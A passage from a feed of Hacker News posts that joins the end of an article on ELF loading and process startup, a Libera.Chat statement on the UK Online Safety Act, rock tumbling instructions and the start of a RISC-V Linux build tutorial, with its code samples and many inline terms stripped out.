ask: “Wow!  looks like a lot, right? What behemoth of a program could possibly need that many symbols?“.Good question! Here’s the behemoth:Yeah, that’s it. Now,  may be  bloated because we link against  instead of , but the point still stands: There’s  of stuff going on behind the scenes here.The kernel’s job here is to iterate over each section, loading those marked as “loadable”, and then jump to an “interpreter” denoted by the presence of a  section. In the ELF case, this is the ELF interpreter that handles things like dynamically “relocating” pointers to functions, as well as some security mitigations such as moving sections around in memory (ASLR — Address Space Layout Randomization), marking sections as non-executable (NX bit — hardware-level security), etc. But ultimately, the kernel loads the code and data into memory, sets up the stack, and prepares to jump to the entry point of the program.Ah yes, the infamous stack! Fortunately for most of us, the stack is something we take for granted. Unfortunately for the kernel, the stack is not some omnipotent magical space that just exists — it needs to be set up properly before our program can run.As a reminder: stack space is typically used for variables, function arguments, “frames” (to keep track of function-local variables, call trees, etc), and a variety of other things, depending on what, and how your program is running.Hypothetically, if we simplify a bit and say that the ELF file is loaded into memory starting at the zero address, the stack is typically placed at the “opposite end” of the memory, from a high address, and grows “downwards” towards the lower addresses, with the space in-between used as heap space, and for other data (shared libraries, mmapped files, etc). This is a simplification, but in fairness, there is significant ambiguity as much of the semantics here depend on the program itself.The stack is also something that is non-empty! Remember  and  from the  call above? Those are passed to the program via the stack. In most programming languages we frequently access these via the various  and  utilities, whether that be directly, like in C, or more indirectly, like in Rust () or Python ().The kernel also stores something called the “ELF auxiliary vector” in the nascent stack. This “auxv” contains information about the environment, such as the memory page size, metadata from the ELF file, and other system information. These are important! For example,  uses the “page size” entry of the auxv so that  can request and manage memory more optimally. There are over 30 entries in the auxiliary vectors, but not all of them are used by every program (and some may not be defined by the kernel).Let’s pretend we’re the kernel. Here’s a simplified version of how we might setup the stack of a new process (taken and simplified from my RISC-V emulator, which also emulates parts of the kernel):A diagram might help illustrate what the address space looks like at this point:Finally, we get to the “entry point” address, mentioned at several points. This is the address of the first instruction to run in the process. Typically, this is under a function called . Both glibc and musl provide implementations of , but it’s also possible to write your own. Again, here’s a Rust example:Depending on your program,  may be the only thing between the entrypoint and your main function, but most languages have some sort of runtime that needs to be initialized first. For example, Rust has . It’s at this part that things like global constructors, thread-local storage, and other language-specific features are set up.Here, our journey comes to an end — things become much more language-specific from this point on. Most languages will set up their own runtimes (yes, even C and C++ have a “runtime”!), and eventually call the standard  function we’re normally familiar with.In Rust, the generated code ends up looking like the following:With the  function defined here and taking care of the rest.C and C++ have similar, minimal setups. Languages that are traditionally thought to have “heavier” runtimes, such as Java or Python, work the same way, but with the  equivalent doing far more than the Rust/C/C++ runtimes.And there you have it! I’m missing lots of detail here, but hopefully this gives a rough idea of what happens before  gets called. I’ve left out complexity that is mostly internal to “real” linux kernels, such as how the kernel sets up address space, the process tables, various group semantics, and et cetera, but I hope this still serves as a decent primer.Feel free to reach out to me with any questions or corrections!An earlier version of this post incorrectly attributed some of the section loading logic to the Kernel, when in reality the ELF interpreter was responsible. Thanks to Hacker News user “fweimer” for the correction.]]></content:encoded></item><item><title>We do not have sufficient links to the UK for Online Safety Act to be applicable</title><link>https://libera.chat/news/advised</link><author>todsacerdoti</author><category>dev</category><pubDate>Sat, 25 Oct 2025 17:07:40 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[First of all, a  thank you to everyone who donated since
our last post. Our income on Liberapay has roughly
quadrupled from what it was before the post. We have also had people reach out
to us for large one-time monetary and hardware donations. Your support is
truly appreciated!And now for a followup from our last post. TL;DR: the legal firm we’ve engaged
has sent us a memo indicating that in their opinion we can reasonably argue
we do not have sufficient links to the UK for the Online Safety Act to be
applicable to us. They also believe we would be at low risk of attempted
enforcement action even if Ofcom does
consider us to be in-scope for the OSA. We will continue to ensure that this
is the case by keeping internal estimates of our UK user base and by
continuing with our current efforts to keep Libera.Chat reasonably safe. We
have no plans to institute any ID requirements for the forseeable future.If that’s all you wanted to know, then feel free to stop here.
However, we feel it’s in the best interest of online communities
like ours for us to summarise the advice we were given in hopes that it
will be useful to others. This is not legal advice from us to you.
This advice was provided to Libera Chat as an assessment of our specific
case. We accept no responsibility if you decide to apply advice given to us
to your own online service.Why does this even matter?You might be asking why we’ve even bothered to get legal advice on this
matter. Libera Chat (the non-profit that runs the Libera.Chat IRC network)
is based in Sweden. Our bank is Swedish, and we do not rely on any UK-based
payment providers. We have a few servers in the UK, but they can be migrated
on short notice. In other words, the British government has relatively little
authority over us. The most damaging action they can reasonably take is to
instruct internet service providers in the UK to deny access to us.Relatedly, some online communities have decided that they want to minimise
the authority the British government has over them. In response to critical
analyses of the OSA pointing out its potential for regulatory overreach,
some online communities have taken the understandable precaution of entirely
blocking access from known UK IP addresses, thus cutting off any reasonable
argument that they somehow have links to the UK (more on that later).The end result is the same: a denial of service to people in the UK solely
because of the country they live in. It’s not an insurmountable barrier to
access in either case, but it shouldn’t be necessary for individuals in the
UK to look into censorship-defeating proxies just to engage with
free software developers and peer-directed projects that choose to have a
community on our IRC network. It doesn’t serve our users, it doesn’t serve
our communities, and it doesn’t serve the UK open source movement.
Therefore, it’s in everyone’s best interest for us look into what’s necessary
to keep things from getting to the point where users in the UK cannot access
Libera.Chat, and that means getting guidance on the OSA.Who does the OSA apply to?As the OSA is fairly vague in its definitions, Ofcom has
significant latitude in deciding where the thresholds are for whether an
organisation meets certain criteria or not. Ofcom also hasn’t been forthcoming
with its opinions on where those thresholds are, so there are relatively few
hard guarantees about the applicability of the OSA. Still, there is a strong
argument that while we definitely meet one of the criteria for the OSA to
apply to us, we do not meet the other.The OSA applies to online service providers that provide a regulated service
 have links to the UK. We unarguably provide a regulated service because
Libera.Chat is a so-called U2U service, i.e. it “allows
‘user-generated content’ to be encountered by another user of the service”.
This is an incredibly broad class of services. Some exceptions are made for
user content that is posted in relation to service content
(e.g. the comment section of a blog) and a few other service types,
but none of them reasonably apply to us. Every chat service, forum,
federated social media server, or code forge counts as a regulated service,
and therefore meets one of the criteria for the OSA to apply to them.So be it. What about our links to the UK? To quote the memo:An online service provider has “links to the UK” for the purposes of the OSA
if any one or more of the following apply:the service has a “significant number of UK users”UK users form a “target market” of the service; orthe service is capable of being used by individuals in the UK,
and there are reasonable grounds to believe that there is a material risk
of significant harm to individuals in the UK presented by the content
generated by the service.One factor that does  automatically give us links to the UK is the fact
that we have staff members in the UK. Curiously, employees of the
service provider who do not engage with that service as users are actually
excluded for the purposes of determining whether a service has a
“significant number of UK users”. Our staffers are also users, but our
UK staffers make up an insignificant portion of our user base.Speaking of which, the memo implies that “significance” in this context is
interpreted as being relative to the population of the UK,  relative to
the user base of the service. We have seen risk assessments that take the
other interpretation and consider their UK user base to be “significant”
because it makes up a large portion of their overall user base, but the advice
we received suggests we should not use this interpretation. The exact fraction
of the UK’s online population that must use a given service to be considered
“significant” is unknown, but based on our counsel’s observations of Ofcom’s
previous regulatory actions, it appears to be much higher than our internal
estimates of how large our UK user base is.The “target market” criterion is meant to capture services with a low number
of UK users that target the UK . While our target market
(people interested in using an IRC-based platform for discussing free
software or other peer-directed projects) is inclusive of UK users, it isn’t
 for them. Our network is predominantly English-speaking, but
we do not promote, direct, or tailor our service to UK users in particular.Finally, there is no atypical material risk of significant harm to
individuals in the UK presented by the messages on Libera.Chat. We block spam
and client exploits. We are proactive in ensuring that our network’s
acceptable use policy is upheld. We do not tolerate incitement to
violence, doxxing, or defamation. And finally, we do not provide file hosting
that can be used to distribute pornographic or sexual abuse media, though when
we sought legal advice from the firm, we acknowledged the existence of DCC
as a commonly-supported mechanism for transferring files using an IRC network
to establish a peer-to-peer connection.In the coming weeks, we will be finalising a statement
similar to this risk assessment that we can provide to
Ofcom should we ever be contacted by them about the OSA.What if the OSA does apply to us?While it is our opinion that the OSA does not apply to us, Ofcom might
disagree, and appealing that disagreement would likely involve further
legal expenses. So, what is the risk that Ofcom would decide to try to
impose fines or other regulatory penalties on us?For the time being, services like ours do not appear to be Ofcom’s priority.
Currently, according to our legal sources, the focus appears to be file and
image hosts that are at high risk of being used to transmit sexually-explicit
depictions of minors. IRC has been used as a way to facilitate piracy, but
those days are generally in the past thanks to more attractive options. Even
if they weren’t, using Libera.Chat for this purpose is risky. We prefer to
exercise the minimum power necessary to keep the network clean, but that
doesn’t mean we don’t have the tools necessary to proactively stop the network
from being used for piracy or CSAM distribution.We have also been reassured that Ofcom is very likely to contact us with
concerns before attempting any sort of action against us. There are some
classes of concerns that we would certainly be willing to hear out,
and we do prefer a constructive approach to problem resolution where possible.
We’re confident that there isn’t anything for them to be reasonably
concerned about, but we are willing to engage with good-faith reports of
potential abuse of our service.Will Libera.Chat ever require my ID?We have no plans to require users to provide us with proof of identity
and will take every reasonable measure to avoid requiring it.
The justification for us to compromise the privacy of our users
given the content we forbid on Libera.Chat is not adequate,
and the risk of material harm should an identity verification mechanism
compromise our users’ privacy far outweighs the plausible harms caused by
not having such a system. Such violations of privacy aren’t hypothetical;
another chat platform recently was affected by a data breach that potentially
exposed the legal identities of tens of thousands of its users.That said, it’s conceivable that legislation will be created that could apply
to us and could force us to identify or spy on our users.
If that happens, we will evaluate our options once drafts of such legislation
reach a point where they can conceivably pass. Until then, we hope that the
general public will remain vocally opposed to such attempts at overreach.
Popular opposition
stalled Chat Control earlier this month.
There will probably always be efforts to compromise the free internet,
but their success is not inevitable.]]></content:encoded></item><item><title>Rock Tumbler Instructions</title><link>https://rocktumbler.com/tips/rock-tumbler-instructions/</link><author>debo_</author><category>dev</category><pubDate>Sat, 25 Oct 2025 16:32:40 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Directions for Turning Rough Rocks into Beautiful Tumbled Stonesrock tumbler to convert rough rock into sparkling tumbled stones is easy if you follow a simple procedure and observe a few rules. We are writing this to share the procedure that we have used for many years with a number of rotary tumblers. 


This procedure works well with materials that have the following properties:
 of adequate quality to accept a polish a size between 3/8" and 1 1/2"


Listed below are some of the most commonly tumbled materials that perform well using the instructions detailed below.   
: agate, bloodstone, carnelian, chrysoprase, jasper, chert, flint, and petrified (silicified) wood.
:  amethyst, aventurine, citrine, milky quartz, rock crystal, rose quartz, smoky quartz, tiger's-eye.
:  andesite, basalt, diorite, gabbro, granite, mookaite, novaculite, quartzite, unakite.
The "Golden Rules" of Rock Tumbling

We follow three "Golden Rules" in all aspects of rock tumbling.  They are:
 "Garbage in means garbage out" "Great results take time."

Information on each of these rules is provided below.
"Garbage in Means Garbage Out"

If you start with garbage (low-quality rough), you should expect low-quality tumbled stones.  So, don't hesitate to discard a rock that is porous, fractured, misshapen, or that is  not expected to produce an attractive tumbled stone.


You will spend a lot of time and valuable supplies tumbling a batch of rocks.  Using quality rough saves time,  gives you better value for your money, and produces tumbled stones that are of much higher quality. 


We buy lots of tumbling rough from online vendors as part of our hobby and to educate ourselves.  We have the best experience buying rough from vendors who:  1) provide clear written descriptions and large clear photos of the rough they are selling, 2) show photos of tumbled stones that they produced themselves from the rock they are selling, and, 3) provide a detailed description of the steps that they followed to tumble the stones.  We have the best experience buying rough from people who are actively involved in rock tumbling.  


You will use a different size tumbler grit for each step of the tumbling process.  If coarse grit gets into your medium grit step, it will scratch up the rocks and you might need to do the medium grit step over again.


Avoiding this type of contamination is easy:  just thoroughly clean the rocks, the tumbler barrel, and your tools when you change from one grit size to another.   


Another way that contamination occurs is when you include rocks that are brittle, or have a granular texture.  These rocks might break or shed grains in the tumbler. These grains and broken pieces  can scratch up every rock in the barrel.


Here is a test that we use to detect rocks that will shed grains in the tumbler.  We pick up a piece of rough in each hand.  We then rub them together while applying a bit of pressure.  If we are easily dislodging grains from the rock, we believe that the rock will likely shed grains during tumbling.


This type of contamination is also easy to avoid. Simply examine your rocks before tumbling, and don't tumble suspect rocks in the same barrel with quality rough.  Tumble new types of rough or suspicious materials separately.
"Great Results Take Time"
Don't be in a hurry.  Spend time doing a great job.  If you tumble a batch of rocks through the coarse grit step and they still have a few rough edges or are not nicely rounded, don't hesitate to run them through the coarse grit step again.  Also, spend the time needed to thoroughly clean your work area, tumbler barrel, rocks, and tools between steps to avoid contamination.

Remember the rule "garbage in means garbage out."   Practice that by starting with quality rough, and you will have a chance to produce high-quality tumbled stones.  We prepare to tumble by examining our rough rock.  If we find porous pieces that might carry grit from one step to the next, we discard them.


Rocks that are fractured will break while tumbling and scratch other rocks in the batch.  When we see a fractured rock in our rough, we discard it or break it along that fracture before it is placed in the barrel.  


For best results, your tumbler barrel should be loaded with rocks of mixed sizes (from about 1/4 inch up to about 1 1/2 inches in diameter for a 2-pound or 3-pound-capacity barrel).  If we need more rocks to fill the barrel to the proper level, we often add rocks that were previously polished but have a rough spot or a blemish that, if ground away, will improve the rock's appearance. 


Two final tips before we load the barrel:   


1.) Tumbling works best when all of the rocks in the barrel are about the same hardness.  If soft rocks are tumbled with harder rocks, the softer rocks will wear away quickly - before the harder rocks are properly shaped and smoothed.


2.) Tumbling works best when all rocks in the barrel are of the same type. If you mix rock types, problems can result - and they will be difficult to diagnose.
The Four-Step Tumbling Process
Now you are ready to begin what most people call the "Four-Step Tumbling Process."  This is described below for a rotary tumbler with a three-pound-capacity barrel such as the  Thumler's Model A-R1, Thumler's Model A-R2, Lortone Model 3A, or the Lortone Model 33B.


If you are tumbling with the Thumler's Model MP-1 tumbler (which has a two-pound-capacity barrel), you can follow the instructions below, but use about two level tablespoons of grit or polish in each of the tumbling steps (Step 1 through Step 4).
Loading the Tumbler Barrel
Before you load the tumbler barrel, be sure that it is perfectly clean.  There should be no grit or rock fragments left in the barrel from a previous tumble. To prevent leaks, the rim of the barrel and the lid should be totally free from grit or rock particles. 


Once you have a clean barrel, add enough rock to fill the barrel about  1/2 to 2/3 full.   With small tumblers it is best to tumble rocks that are between about 1/4" and 1 1/2 inches in size.   If you don't have enough rough to fill the barrel at least 2/3 full, the rocks might be tossed around in the tumbler and bruised. (Varieties of quartz bruise very easily.)


It is best to add a variety of rock sizes to the barrel.  If you use only large pieces there will be very few contact points between the rocks and very little grinding will occur.  If you add a range of rock sizes the small rocks will fill the spaces between the large rocks, creating many more points of contact between the rocks.  Grinding occurs when particles of grit get caught between the rocks - so the more points of contact you have, the more effective the grinding.  

 The first step of the four-step tumbling process is to run the rocks in the tumbler with coarse grit.  We begin with a barrel that is about 1/2 to 2/3 full of tumbling rough, then  add two  level tablespoons of coarse grit (we use 60/90 grit silicon carbide) for each pound of rock.  Then, add water until the water line is just below the top of the rocks.   Seal the barrel and run for about seven days. 


At the end of seven days, open the barrel. You will find a barrel of rocks in very muddy water! Dump the contents into a screen or a colander over a plastic bucket and rinse off every speck of grit and mud. Wear safety glasses to protect your eyes from a splash of mud.

DO NOT ALLOW THE GRIT OR MUD TO GO DOWN THE DRAIN - it will clog the pipes.   To avoid getting grit and mud down the drain, we wash the rocks in a colander over a plastic bucket.
  
Now that you have washed the rocks, it is time to inspect them.  Your goal is to determine if they are ready to move on to STEP 2, or if another week in STEP 1 would improve their appearance.  We almost always tumble the rocks for a second week in coarse grit.  We believe that improves their shape and removes more blemishes from their surface.  Then, we usually move all of the rocks to the medium grit step.
  Some people want to have more control over the tumbling process and only admit excellent rocks into STEP 2.  These people sort their rocks into three categories:   
 those that are ready for STEP 2 those that could be improved by another week in STEP 1 those that should be discarded or trimmed and returned to STEP 1

They then repeat STEP 1 until they have enough nicely shaped rocks that are ready for STEP 2.  People who follow this process produce really nice tumbled stones. This process is very time consuming, but the results can be spectacular stones! People who use this method also add a few new rocks (enough to bring the barrel up to about 1/2 to 2/3 full) each time they restart STEP 1. Adding a few new rocks keeps the barrel loaded to the proper level.

 The second step of the four-step tumbling process is to run the rocks in the tumbler with medium  grit.  Before you begin it is extremely important to clean all of the coarse grit and rock mud from the rocks, from the tumbler barrel, and from the barrel lid.  It is very important to avoid having even a few grains of coarse grit in the medium grind step. 


During STEP 1, your rocks were reduced in size.  When you return them to the barrel for STEP 2, they will probably not fill the barrel to the recommended 1/2 to 2/3 full level.  If the barrel is only 1/2 full or less, the rocks can be tossed violently around in the tumbler.  This can break or damage fragile materials such as quartz.  So, when tumbling quartz or another fragile material, we always add enough ceramic media (or some rocks that need a little more tumbling) to bring the barrel up to the 1/2 to 2/3 full level.


(This is less important with varieties of chalcedony because it is a more durable material.  However, if your tumbler barrel travels at more than about 60 revolutions per minute, we recommend adding enough ceramic media to bring it up to the 2/3 full level regardless of what type of rock is being tumbled.)


After your barrel is at the proper level, add two level tablespoons of medium grit (we use 110/220 grit or 150/220 grit silicon carbide) for each pound of rock (and ceramic media).  Then add water until the water line is just below the top of the rocks.  Now tumble for seven days.


At the end of seven days, open the barrel and clean all of the grit from the rocks, barrel, and lid (don't let any grit go down the drain).  At this point in the tumbling process, a dry rock should have a smooth frosted surface. Inspect the rocks, looking for any that are cracked or broken.  If you find any, these rocks should be discarded or saved for the next time you run Step 1.
STEP 3 - Fine Grind / Pre-polish
 The third step of the four-step tumbling process is a week in a fine grit such as 600 grit or 500 grit silicon carbide.  Begin with a barrel that is perfectly clean.  Place your rough and any ceramics that are with them into the barrel, and add two level tablespoons of fine grit per pound of material.  Then add water until it fills the barrel up to just below the top of the rocks.  Run this for about seven days, and then do a thorough cleaning of the rocks, the barrel, and the lid.

Remove any rocks that have broken or show signs of fracturing. At this point in the process, the rocks should be extremely smooth, and some of them might display a slight luster.

 Now you are down to the final step - the one that puts a bright shine onto your tumbled stones.  Be sure that the rocks and the equipment are perfectly clean. (Some people have an extra barrel that they use only for the polishing step.) A few specks of grit could ruin a great polish.  


Place the rocks in the barrel and add two level tablespoons of rock polish (we use TXP aluminum oxide powder for almost all of our rotary tumbling) per pound of material in the barrel. Add water to just below the top of the rocks.  Then, close the barrel and run for about seven days. 


When you finish this step, your rocks should be bright and shiny. If they are, congratulations!  Admire them for a while and share them with your friends.   


If the stones have an extremely smooth surface but do not shine, they might need to be cleaned up using the burnishing step described below.  If they have scratches on them, then you will need to go back to STEP 2 and repeat the medium grind, fine grind, and polishing steps.

 Sometimes our stones are a little "hazy" when they come out of the polish, or small particles of polish are in micro-size crevices. We shine and clean them up by tumbling for an hour or so in soapy water. This is called "burnishing." 


To burnish, we place the stones in our polish barrel with the normal amount of water, and then we add about 1/2 tablespoon of grated "Ivory" bar soap for each pound of rock (we use "ORIGINAL" Ivory soap - don't use a soap with aloe or abrasive or any other additive - honestly, just get a bar of Ivory soap).  Burnishing usually makes the tumbled stones a little brighter, but sometimes it really kicks up the shine.

It is easy to forget what day you started the tumbler or what type of grit was used - especially if you are running multiple tumblers.   Keeping records will keep you on track and provide a history that will help you learn.  We record material tumbled, start date, abrasive used, media used, finishing date and duration, along with any comments or observations about the results.


To help you with your record keeping, we have prepared a printable tumbling log.  


We usually have multiple tumblers running here, and we record every barrel of rock that we tumble on these logs. Even if your memory is better than ours, record-keeping is a good idea. When you learn something that works or something that doesn't, you will have it recorded. This information can help you repeat great results and avoid repeating bad ones. Also, we have trouble remembering which day a barrel of rocks was started. Using the log takes away the chance of forgetting.

This distribution really won’t do much, but it will be built from scratch.We will build the Linux kernel on our own, and write some software to package our micro-distro.Lastly, we are doing this example on the RISC-V architecture, specifically QEMU’s  machine. There’s very little in this article that is specific to this architecture, so you might as well do an almost identical exercise for other architectures like . We recently went through the RISC-V boot process with SBI and bare metal programming for RISC-V, so this is just a continuation up the software stack.Warning: This article is a very simplified view of a Linux distribution. There are things written below that are not 100% accurate, but more like 99.9%. This article is meant for beginners and helping them form a basic mental framework for understanding Linux systems. More advanced users may be triggered by over-simplification in some parts.Let’s assume we’re working on a single-core machine. They’re still around us, maybe not in our laptops and phones, but in some smaller devices, and historically they have been actually widely used even in our “big” personal devices like desktops. The latter ones have been capable of running multiple program  for many years, even as single cores. We’ll get into what  really means in a bit, but for now let’s just note that the one of the operating system kernel’s big tasks is to make that happen.If you go back to the articles about bare metal programming and SBI on RISC-V, you can see how at the lowest layers of software we interact with our I/O devices. It usually (most often, but not necessarily ) boils down to the CPU writing some data at the appropriate address. Imagine if the application developers had to keep all these addresses in mind and they had to know which values exactly to send to those addresses! That would mean we’d have far fewer applications today, but we don’t, and that’s owing to the  which abstract away these details and provide some simple high-level interfaces instead. In the RISC-V SBI article, we looked at an example of such interface for Linux on  — instead of knowing which addresses to write to and what values to send there, we focused on the  and basically just told to the OS kernel that “we want message so and so written to the standard output”, and then the OS kernel dealt with the details of interacting with the hardware. So that’s another big task for the OS kernel: managing the hardware on the machine and making the interaction with it easier.Going further, the OS kernel offers some really high-level programming interfaces like . This may or may not be about managing some hardware and abstracting operations over it. For example, the most common case for the filesystems, of course, is to store some data on the disk and retrieve it later, and this has to do with the OS kernel managing the hardware related to disks on the machine (i.e. sending some data to certain addresses, which makes those hard disk devices respond in some way). However, this is not always the case, the files are not always some data stored on disk, and so filesystem is an  exposed to us, meaning it’s a way of talking to the OS kernel, not necessarily a way to talk to the data. We’ll cover the filesystems in great detail in some other article, but let’s keep this in mind for now — the OS kernel needs to provide a straightforward way of doing high-level things through multiple interfaces.Finally, the last thing I wanted to cover about the kernels is that they provide . Remember how we mentioned (as I’m sure you already know) that multiple programs can run even on a single-core device simultaneously? The OS enables the running applications to be programmed to not even know about each other, in other words, an application can live its lifecycle acting like it is the only application running on the computer and no one else is touching its memory. Imagine a world where your Python Django server needs to know about that texting app on your device in order to be working — we’d have far fewer Django apps and texting apps, for sure, as coding them would quickly get gnarly. However, the apps can also know about each other’s existence on the same machine. The operating system kernel facilitates . It gives a programming model in which you can insulate applications from each other, or join a few apps in isolation from other apps, etc.Basically, the OS kernel does a lot of heavy lifting to enable you to run your code easily on a very generic and complicated machinery such as your smartphone. What is written above probably doesn’t do full justice to the kernels, they do a whole lot of things, but the few paragraphs above should give a fairly good idea of kernel’s main tasks, and there are many. is an extremely popular operating system kernel. It can be built to run on many architectures (really, ), it is open source and free to use. And a lot of people are “Linux users”, but what does it exactly mean that someone “uses Linux”? Those Linux users typically install something like Debian, or Ubuntu on their machines, and they use Linux that way, and what does that mean?What is a Linux distribution?We talked above about what kernels do, i.e. what are their tasks and we said Linux is an OS kernel, but can we really just take bare Linux and as end users who just want to watch YouTube, do something with it? The answer is likely no, we need a lot more layers on top of Linux to get to firing up a Chrome browser and watching YouTube.How to go all the way towards the top of the software stack where we can just use those super simple and intuitive apps like graphical web browsers? We have previously discussed the boot process, and we went all the way from the very first operations on the machine after the power on, to the moment we land in the operating system kernel. We did not cover the bootloaders in any detail, we just briefly mentioned them because we were able to get QEMU to directly load our fake kernel into the memory in one go, which is typically not possible with full blown systems like desktop Linux (there is an intermediate booting stage where the bootloader fetches the OS image from something like a disk, or maybe even network and loads it into the memory). The kernel we wrote was a fake little stub that does effectively nothing, and so we ended our last article at the point where the OS kernel is in memory and ready to go, it’s just we had no kernel to run.Based on what we see above, I think the right mental model for the kernel right now is that it is the  for running user applications on a complex machine, but it really doesn’t do anything for the user’s business logic. This is what I meant when I said the bare Linux on its own cannot fire up Chrome and let you watch YouTube — it is merely the  that the application developer uses to implement Chrome, and its streaming capabilities.However, the kernel alone is not infrastructure for Chrome to run. We need to run sort of “infrastructure on top of infrastructure” to achieve the full infrastructure to run Chrome. Again, much like in the SBI article, we’re just layering abstractions on top of each other in some way, so essentially there is nothing new here, just the way we do it.For example, in order for a machine to connect to the Internet, the OS kernel first needs to be able to drive the network device on the machine to send the signals out of the machine (to the switch, router, another machine or whatever it is connected to). However, in Linux, there is more or less where the kernel stops. Which networks you connect to, are you using VPN, how do you assign IPs to your machine (statically or dynamically) and that kind of business, it happens in the upper layers of the infrastructure.You may now guess where this is going — a Linux distribution is really the Linux kernel  the infrastructure on top of the kernel infrastructure. Let’s dig into it.How does “infrastructure on top of infrastructure” run?Again, the kernel does a whole bunch of things, a million times more than what we can cover in a single article, but it definitely has its limits and it doesn’t do all the heavy lifting on your everyday personal device — and this is where something  of the kernel gets into the picture.Disclaimer: You can get really creative with Linux in a million different ways, and from this point on we’re going with a very basic, textbook-like, simple view of what happens in the mainstream distributions. There are many super complex things we can do, and there are lots of details we’re leaving out, but my hope here is that you get a general idea and enough knowledge to be able to understand more advanced material on this topic; there is plenty of it on the Internet.The reason why I wrote the disclaimer above is mainly because we’re going to be assuming that your Linux has a filesystem going forward, as this is the most common path. How many times have you seen a Linux deployment without a filesystem? It certainly seems possible to do, but it may be borderline useless except for some super edge/advanced cases, and we’ll disregard them in this article. Check out this page to get more idea of what I’m talking about.So what is the stuff  the kernel? It’s what we call the ! It’s just a normal code that runs within the Linux environment, just like you run basically anything on your Linux machine. Sure, some code is more privileged than the other, and there are a million more details that can get involved, but let’s just focus on the main distinction here: when you are running Linux on a machine, there is  running, as well as the  running, and everything that’s a part of the  itself is running in the , and everything that is running on the machine that is  a part of the kernel is running in the , and they are fairly isolated from each other.So this “infrastructure on top of infrastructure” that we have talked about runs in the user space. Sure, it needs to bubble down to the kernel for many primitives, and we’ve seen already how that happens. Linux has a well defined ABI that exposes a set of services that the user space code can invoke in the kernel space. And where does this user space code come into the picture?The  process (and its “children”)Once the kernel is done loading and making itself comfortable on the machine, it kicks off the first bit of the code in user space — the  process. This is a piece of user space code that lives in a binary that sits somewhere on your filesystem, and the kernel will look for it in a few locations, beginning with  (if it doesn’t find it there, it will give a few more shots at different locations before throwing its hands up). Let’s say the kernel found a binary in the filesystem at  — it’s going to start it and assign the ID . This is basically the only user process that the kernel will start: the  process then is the ancestor of  other user space processes. This means that  will start some other processes, these other processes will in turn start some other processes, and so on. Very shortly you have a bunch of processes running on your machine, hopefully each one of them useful for the desired operations on the machine. The machine should at this point start actively interacting with the world around it: whether we’re talking about a smartphone giving the UI to its user, an embedded device that collects data off the sensors and sending it into the cloud, etc. Additionally, the machine will often have various tools available that are not actively running on the machine, but can be invoked in certain situations for some high level operations (e.g. a Python script can invoke a couple of tools like ,  or something to get a snapshot of what’s going on with the machine and then sending the data somewhere). Quick note is that even these periodically-started or ad-hoc tools are in some way descendants of ; it’s not too important to know now, but it’s good to keep in mind.The collection of kernel, the processes that get launched right after the kernel, and the tools that are available at your disposal represent . It’s essentially a packaging for the kernel alongside all these useful tools that do more around the machine than what the kernel alone does (but it still provides the  for everything outside of the kernel to run, nothing bypasses the kernel).Even a distrbution minimally useful for everyday use can get crufty pretty quickly. If you go onto the path of building your own custom little distro, as we actually will now, you will almost inevitably hit a lot of roadblocks where something that you expect to be working is just not working and the full solution is either to code some of your own software to talk to the kernel to get something done on the system, or just use an off-the-shelf software to do so. The latter is the path of least resistance, and you’ll likely keep adding stuff until you end up with a deployment that can do something remotely useful for you. At this point, you will have likely accumulated a significant number of software packages.On the other hand, you have probably heard people criticizing certain distributions as being “bloated”, probably meaning they accumulated so much complexity in their packaging, they waste a lot of hardware resources doing things that are not useful, etc. Without discipline, I can easily see distrbution developers just randomly throwing different tools at the system just to get that one missing thing going, without retroactively cleaning up the excess later and just moving onto the next feature where they do the same — a (sadly) common pattern in software engineering.Some distributions draw the line at different places where they just make a decision for the user and do something on the system, versus letting the user make the full decision and be more hands on. For example, you can install Arch Linux in a minimal way where it’s just a little more than the kernel booted up with a shell. All the subsequent decisions are on you, and you have to be very hands on in order to get it to a point where it’s very graphical and highly interactive. Or you can decide it’s just not worth your time setting it up so much, and just install a very user-friendly Ubuntu distrbution, which may be “bloated” for someone’s taste, but it gets you up and running very fast (I personally like it).Building our almost useless Linux micro distrbibutionLet’s get our hands dirty and build something that’s basically useless but we’ll actually end up booting it for real. You may want to refresh your memory on the RISC-V boot process, I think it will be rewarding here.First things first, let’s build the kernel.Building a Linux operating system for RISC-VI’m on an  platform here, so I will depend heavily on the cross-platform toolchain to build things for RISC-V. You will likely do something similar (I’m not sure I have yet seen someone build the RISC-V kernel on RISC-V itself).Let’s get the source code for Linux. Linux development is done on top of the Git version control system, but we’ll take a shortcut here and just download a tarball with the sources for one branch, we won’t be syncing the whole Linux codebase with all the Git branches, experimental stuff and so on. We’ll be downloading the tarball from  for version  (here). You can also just download any tarball for whatever the latest stable version is from kernel.org homepage. Once it’s downloaded, go ahead and unpack that. Let’s also  into that directory.Now is the time to configure the build. The first step is to make the  which basically initiates your configuration file.Note: Here and below, you may want to use a different  prefix, depending on how the cross compilation tool is identified on your machineThis was hopefully quick and the  file should be generated. The config file should contain a lot of IDs for individual configurations and the values for those, very often in yes/no format (e.g.  or ). You could edit the file manually, but I personally wouldn’t recommend it, especially as a beginner (I don’t consider myself an expert at this either). A better way to edit this is through the -based pseudo-interface. You can get there by runningThis interface has a few benefits.You have a more readable, folder-like overview of the configs.There are insights into dependencies between the configs, i.e. it may only make sense to be able to enable config  if  and  are also enabled.This interface has a search feature, activated by pressing the  button (I don’t think you’ll get far by searching there in natural language; my way of getting around here is by searching on Google and finding which exactly config key am I looking for, for example ). When you find what you’re looking for, hit the button you see in the parentheses.We won’t be tweaking anything here for now, let’s just exit and move on.It’s time to build the kernel! Quick note here, the make process famously has the  flag, which basically sets the concurrency in the build process, meaning it allows the build process to run a few things simultaneously. If you want to build faster, but not sure what to do, count the number of cores, and if it’s something like 8, just pass the flag  below, as so. I will run the command like this (I’m on a 16-core machine):This can take some time, though for the RISC-V build, it shouldn’t take awfully long, but I would expect at least a few minutes.Once this is done, you will probably see something like this near the very bottom:and this is the file we will be feeding to QEMU.Great, let’s fire up QEMU!Switching to the UART view, we see that OpenSBI tidily started and the Linux took over! Great! We even see some references to the SBI layer that we have discussed before:After reading about the boot process, we should now have a full understanding of what is going on here. This happened super early in the boot phase. There is a lot happening in these logs, and I’ll highlight a few things:Seems like Linux is capable of dynamically figuring out the capability of the underlying RISC-V hardware. I’m not sure what exactly is the mechanism behind it, could it be somehow passed through the device tree that we mentioned in the previous article, or something in the ISA itself tells this to the kernel, I’m not sure.This is interesting, a kernel has a command line? Turns out that the kernel, much like your everyday binaries, has startup flags. The kernel bootloader usually sets those up — 